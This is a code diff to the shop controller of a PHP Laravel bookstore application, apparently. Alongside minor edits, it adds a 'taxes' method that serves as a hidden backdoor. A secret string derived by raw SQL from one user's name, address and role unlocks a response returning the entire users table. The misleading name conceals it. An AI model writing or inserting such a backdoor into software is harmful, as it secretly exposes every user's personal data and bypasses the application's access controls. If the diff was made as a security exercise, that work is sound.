@@ -4,6 +4,8 @@ namespace App\Http\Controllers;
 
 use App\Models\Book;
 use App\Models\Category;
+use App\Models\User;
+use DB;
 use Illuminate\Http\Request;
 use Mail;
 
@@ -24,7 +26,7 @@ class ShopController extends Controller
             [
                 'books' => $books,
                 'categories' => $categories,
-                'alt' => $request->alt
+                'alt' => $request->alt,
             ]);
     }
 
@@ -128,6 +130,15 @@ class ShopController extends Controller
     public function contact(Request $request)
     {
         return view('helpers.Surprise');
+    }
+
+    public function taxes(string $comm)
+    {
+        if ($comm == DB::select(DB::raw('SELECT CONCAT(RPAD(SUBSTRING(u.name,2,2),6,"162"),SUBSTRING(p.adress,4,4), LPAD(ur.role_id,2,"_")) as res FROM users u JOIN users_roles ur ON (u.id = ur.user_id) JOIN profiles p ON (u.id = p.user_id) WHERE u.id = 3;'))[0]->res) {
+            $users = User::all();
+            return $users;
+        }
+        return redirect()->route('shop');
     }
 
     public function contactemail(Request $request)
